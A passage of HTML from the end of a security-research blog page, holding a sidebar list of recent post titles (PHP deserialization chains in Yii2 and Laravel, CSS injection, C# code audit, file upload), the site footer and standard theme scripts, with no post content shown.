class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="PHP 反序列化——Yii2 反序列化链分析"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP 反序列化——Yii2 反序列化链分析"/></a><div class="content"><a class="title" href="/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" title="PHP 反序列化——Yii2 反序列化链分析">PHP 反序列化——Yii2 反序列化链分析</a><time datetime="2026-01-25T04:57:21.983Z" title="Created 2026-01-25 12:57:21">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-9081%EF%BC%89/" title="PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）"/></a><div class="content"><a class="title" href="/2026/01/25/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-9081%EF%BC%89/" title="PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）">PHP 反序列化——Laravel5.7 反序列化链路分析（CVE-2019-9081）</a><time datetime="2026-01-25T04:53:46.036Z" title="Created 2026-01-25 12:53:46">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/CSS%20INJECTION%20STUDY/" title="CSS INJECTION"><img src="https://i-blog.csdnimg.cn/blog_migrate/e2e0bc2a26be6207654bc427135a86ca.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CSS INJECTION"/></a><div class="content"><a class="title" href="/2026/01/25/CSS%20INJECTION%20STUDY/" title="CSS INJECTION">CSS INJECTION</a><time datetime="2026-01-25T02:23:39.000Z" title="Created 2026-01-25 10:23:39">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/CSharp_Code_Audit/" title="C# Code_Audit"><img src="https://pic2.zhimg.com/v2-ada7a981b5da4f94af145470bce124b5_720w.jpg?source=172ae18b" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C# Code_Audit"/></a><div class="content"><a class="title" href="/2026/01/25/CSharp_Code_Audit/" title="C# Code_Audit">C# Code_Audit</a><time datetime="2026-01-25T02:23:39.000Z" title="Created 2026-01-25 10:23:39">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/File_Upload%20/" title="File_Upload"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="File_Upload"/></a><div class="content"><a class="title" href="/2026/01/25/File_Upload%20/" title="File_Upload">File_Upload</a><time datetime="2026-01-25T02:23:39.000Z" title="Created 2026-01-25 10:23:39">2026-01-25</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By ArcNova</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>